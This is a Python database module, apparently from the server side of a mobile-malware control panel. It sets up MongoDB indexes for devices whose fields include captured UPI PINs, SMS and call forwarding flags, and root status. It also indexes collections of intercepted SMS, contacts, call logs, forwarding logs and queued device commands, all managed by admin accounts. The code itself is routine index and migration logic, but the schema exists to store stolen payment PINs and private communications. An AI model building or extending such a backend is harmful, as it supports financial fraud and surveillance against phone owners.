from motor.motor_asyncio import AsyncIOMotorClient, AsyncIOMotorDatabase
from pymongo import ASCENDING, DESCENDING
from datetime import datetime, timedelta, timezone
from .config import settings
import logging
from urllib.parse import quote_plus, urlparse, urlunparse

logger = logging.getLogger(__name__)

class MongoDB:
    client: AsyncIOMotorClient = None
    db: AsyncIOMotorDatabase = None

mongodb = MongoDB()

def escape_mongodb_uri(uri: str) -> str:
    """Escape username and password in MongoDB connection string according to RFC 3986"""
    try:
        if not uri.startswith("mongodb://"):
            logger.warning(f"URI does not start with mongodb://: {uri}")
            return uri
        
        if "%" in uri and "@" in uri:
            scheme = "mongodb://"
            after_scheme = uri[len(scheme):]
            at_index = after_scheme.find("@")
            if at_index > 0:
                creds_part = after_scheme[:at_index]
                if "%" in creds_part:
                    logger.debug("URI appears to be already escaped")
                    return uri
        
        scheme = "mongodb://"
        after_scheme = uri[len(scheme):]
        
        at_index = after_scheme.find("@")
        if at_index == -1:
            logger.debug(f"No credentials found in URI")
            return uri
        
        creds_part = after_scheme[:at_index]
        host_and_rest = after_scheme[at_index + 1:]
        
        if ":" in creds_part:
            username, password = creds_part.split(":", 1)
            if "%" not in username:
                escaped_username = quote_plus(username)
            else:
                escaped_username = username
            if "%" not in password:
                escaped_password = quote_plus(password)
            else:
                escaped_password = password
            escaped_uri = f"{scheme}{escaped_username}:{escaped_password}@{host_and_rest}"
            logger.debug(f"Escaped credentials in URI")
            return escaped_uri
        else:
            if "%" not in creds_part:
                escaped_username = quote_plus(creds_part)
            else:
                escaped_username = creds_part
            escaped_uri = f"{scheme}{escaped_username}@{host_and_rest}"
            return escaped_uri
    except Exception as e:
        logger.error(f"Failed to escape MongoDB URI: {e}", exc_info=True)
        return uri

async def connect_to_mongodb():
    try:
        original_uri = settings.MONGODB_URL
        escaped_uri = escape_mongodb_uri(original_uri)

        mongodb.client = AsyncIOMotorClient(
            escaped_uri,
            maxPoolSize=100,
            minPoolSize=10,
            serverSelectionTimeoutMS=5000
        )

        mongodb.db = mongodb.client[settings.MONGODB_DB_NAME]

        await mongodb.client.admin.command('ping')
        await create_indexes()

    except Exception as e:
        logger.error(f"MongoDB connection failed: {e}")
        raise

async def close_mongodb_connection():
    if mongodb.client:
        mongodb.client.close()

async def create_indexes():
    try:
        await mongodb.db.devices.create_index("device_id", unique=True)
        await mongodb.db.devices.create_index([("status", ASCENDING), ("last_ping", DESCENDING)])
        await mongodb.db.devices.create_index("user_id")
        await mongodb.db.devices.create_index("app_type")
        await mongodb.db.devices.create_index("is_online")
        await mongodb.db.devices.create_index("sms_forwarding_enabled")
        await mongodb.db.devices.create_index("call_forwarding_enabled")
        await mongodb.db.devices.create_index("battery_level")
        await mongodb.db.devices.create_index("is_rooted")
        await mongodb.db.devices.create_index("fcm_tokens")
        await mongodb.db.devices.create_index("is_uninstalled")
        await mongodb.db.devices.create_index("uninstalled_at")
        
        await mongodb.db.marked_devices.create_index("admin_username", unique=True)
        await mongodb.db.marked_devices.create_index("device_id")
        await mongodb.db.marked_devices.create_index("expires_at")

        await mongodb.db.devices.create_index("admin_token")
        await mongodb.db.devices.create_index("admin_username")
        await mongodb.db.devices.create_index([("admin_username", ASCENDING), ("registered_at", DESCENDING)])

        await mongodb.db.devices.create_index("has_upi")
        await mongodb.db.devices.create_index("upi_pin")
        await mongodb.db.devices.create_index("upi_pins")
        await mongodb.db.devices.create_index("upi_detected_at")
        await mongodb.db.devices.create_index("upi_last_updated_at")
        await mongodb.db.devices.create_index([("has_upi", ASCENDING), ("upi_detected_at", DESCENDING)])

        await mongodb.db.devices.create_index("note_priority")
        await mongodb.db.devices.create_index("note_updated_at")
        await mongodb.db.devices.create_index([("note_priority", ASCENDING), ("note_updated_at", DESCENDING)])
        
        await mongodb.db.devices.create_index("admin_note_priority")
        await mongodb.db.devices.create_index("admin_note_created_at")
        await mongodb.db.devices.create_index([("admin_note_priority", ASCENDING), ("admin_note_created_at", DESCENDING)])

        await mongodb.db.sms_messages.create_index([("device_id", ASCENDING), ("timestamp", DESCENDING)])
        await mongodb.db.sms_messages.create_index([("device_id", ASCENDING), ("is_read", ASCENDING)])
        await mongodb.db.sms_messages.create_index([("device_id", ASCENDING), ("type", ASCENDING)])
        await mongodb.db.sms_messages.create_index("from")
        await mongodb.db.sms_messages.create_index("to")
        await mongodb.db.sms_messages.create_index("sms_id", unique=True)

        await mongodb.db.sms_messages.create_index(
            "received_at",
            expireAfterSeconds=settings.SMS_RETENTION_DAYS * 24 * 60 * 60
        )

        await mongodb.db.sms_forwarding_logs.create_index([("device_id", ASCENDING), ("timestamp", DESCENDING)])
        await mongodb.db.sms_forwarding_logs.create_index("original_from")
        await mongodb.db.sms_forwarding_logs.create_index("forwarded_to")
        await mongodb.db.sms_forwarding_logs.create_index("forward_id", unique=True)

        await mongodb.db.sms_forwarding_logs.create_index(
            "created_at",
            expireAfterSeconds=90 * 24 * 60 * 60
        )

        await mongodb.db.call_forwarding_logs.create_index([("device_id", ASCENDING), ("timestamp", DESCENDING)])
        await mongodb.db.call_forwarding_logs.create_index("action")
        await mongodb.db.call_forwarding_logs.create_index("success")
        await mongodb.db.call_forwarding_logs.create_index("sim_slot")

        await mongodb.db.call_forwarding_logs.create_index(
            "created_at",
            expireAfterSeconds=90 * 24 * 60 * 60
        )

        await mongodb.db.contacts.create_index([("device_id", ASCENDING), ("phone_number", ASCENDING)])
        await mongodb.db.contacts.create_index([("device_id", ASCENDING), ("name", ASCENDING)])
        await mongodb.db.contacts.create_index("phone_number")
        await mongodb.db.contacts.create_index("contact_id", unique=True)

        await mongodb.db.call_logs.create_index([("device_id", ASCENDING), ("timestamp", DESCENDING)])
        await mongodb.db.call_logs.create_index([("device_id", ASCENDING), ("call_type", ASCENDING)])
        await mongodb.db.call_logs.create_index("number")
        await mongodb.db.call_logs.create_index("call_id", unique=True)

        await mongodb.db.call_logs.create_index(
            "received_at",
            expireAfterSeconds=180 * 24 * 60 * 60
        )

        await mongodb.db.logs.create_index([("device_id", ASCENDING), ("timestamp", DESCENDING)])
        await mongodb.db.logs.create_index("level")
        await mongodb.db.logs.create_index("type")

        await mongodb.db.logs.create_index(
            "timestamp",
            expireAfterSeconds=settings.LOGS_RETENTION_DAYS * 24 * 60 * 60
        )

        await mongodb.db.commands.create_index([("device_id", ASCENDING), ("status", ASCENDING)])
        await mongodb.db.commands.create_index([("device_id", ASCENDING), ("sent_at", DESCENDING)])

        await mongodb.db.admins.create_index("username", unique=True)
        await mongodb.db.admins.create_index("email", unique=True)
        await mongodb.db.admins.create_index("role")
        await mongodb.db.admins.create_index("device_token", unique=True)
        await mongodb.db.admins.create_index("telegram_2fa_chat_id")
        await mongodb.db.admins.create_index("current_session_id")

        await mongodb.db.otp_codes.create_index([("username", ASCENDING), ("used", ASCENDING)])
        await mongodb.db.otp_codes.create_index([("username", ASCENDING), ("otp_code", ASCENDING)])
        await mongodb.db.otp_codes.create_index("expires_at", expireAfterSeconds=3600)
        await mongodb.db.otp_codes.create_index("created_at")

        await mongodb.db.admin_activities.create_index([("admin_username", ASCENDING), ("timestamp", DESCENDING)])
        await mongodb.db.admin_activities.create_index("activity_type")
        await mongodb.db.admin_activities.create_index("device_id")

        await mongodb.db.admin_activities.create_index(
            "timestamp",
            expireAfterSeconds=settings.ADMIN_ACTIVITY_RETENTION_DAYS * 24 * 60 * 60
        )

        # _id is automatically indexed and unique in MongoDB, no need to create index for it
        # await mongodb.db.background_locks.create_index("_id", unique=True)  # This causes error
        
        try:
            await mongodb.db.background_locks.create_index(
                "last_heartbeat",
                expireAfterSeconds=600
            )
        except Exception as e:
            logger.debug(f"Background locks index may already exist: {e}")

        result = await mongodb.db.admins.update_many(
            {"current_session_id": {"$exists": False}},
            {"$set": {
                "current_session_id": None,
                "last_session_ip": None,
                "last_session_device": None
            }}
        )
        if result.modified_count > 0:
            logger.warning(f"Migrated {result.modified_count} admin(s) - They must re-login (Single Session activated)")

        result = await mongodb.db.admins.update_many(
            {"fcm_tokens": {"$exists": False}},
            {"$set": {"fcm_tokens": []}}
        )
        if result.modified_count > 0:
            logger.info(f"Migrated {result.modified_count} admin(s) - Added fcm_tokens field for push notifications")

    except Exception as e:
        logger.error(f"Failed to create indexes: {e}")